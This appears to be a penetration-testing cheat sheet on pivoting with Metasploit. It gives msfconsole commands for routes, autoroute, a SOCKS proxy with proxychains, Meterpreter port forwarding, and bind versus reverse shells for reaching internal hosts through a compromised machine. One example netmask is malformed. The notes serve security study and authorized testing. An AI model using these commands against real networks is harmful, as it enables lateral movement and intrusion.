# ⭕ Metasploit Pivoting

## <mark style="color:red;">Manual Route</mark>

this method will give the full access to the target IP address like its siting in our LAN ( only accessible in metasploit )

```
background the session
route add 10.0.1.0/24 [session id]
```

## <mark style="color:red;">Auto Route Reverse Tunnel</mark>

Once the Meterpreter session is active, we’ll send it to the background and switch to the multi/manage/autoroute module. This will allow us to configure a reverse tunnel through the Meterpreter session and use that with a SOCKS proxy.

```
use multi/manage/autoroute
set session 1
exploit

use auxiliary/server/socks4a
set srvhost 127.0.0.1
exploit -j
```

The autoroute module creates a reverse tunnel and allows us to direct network traffic into the appropriate subnet.

We can use a local proxy application like Proxychains to force TCP traffic through a TOR or SOCKS proxy. We can configure it by adding the SOCKS4 proxy IP and port to the config file (`/etc/proxychains.conf`):

```
proxychains rdesktop 192.168.120.10
```

The route created by Meterpreter also allows us to access any other computer on that internal network.

## <mark style="color:red;">Port Forward</mark>

forward only the given remote port to the given local port specifically ( only accessible in msfconsole )

```
portfwd [add | delete | list | flush]  -L [optional local ip] -l [local port] -p [remote port] -r [remote ip]

portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
```

now we can scan our local port 8000 to scan the remote port 80 of the target

## <mark style="color:red;">Pivote Bind Shell</mark>

usually used when exploiting a machine in the internal network. first we have to do port forwarding to scan the network

```
portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
```

now add a route to target ip in the internal network

```
route -h
route add 10.0.1.5/24 [session number] 
```

now choose your exploit and set the rhost to the target ip in the internal network and run the exploit and remember:

```
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 2552.55.255.0 8)
use auxiliary/server/socks4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Another way:

```
background #meterpreter session
use post/windows/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks4a
run #Proxy port 1080 by default
```

{% hint style="warning" %}
#### Always use a bind shell when pivoting.
{% endhint %}

if we use a reverse shell the target machine on the internal network wont be able to route back the packets to us

![](<../../.gitbook/assets/image (267).png>)

## <mark style="color:red;">Pivot Reverse Shell</mark>

while using a reverse shell with pivoting we have to set the RHOST to target ip in the internal network and set the LHOST to the machine that we have already compromized

```
RHOST >>> internal target
LHOST >>> compromized machine
```

![](<../../.gitbook/assets/image (269).png>)
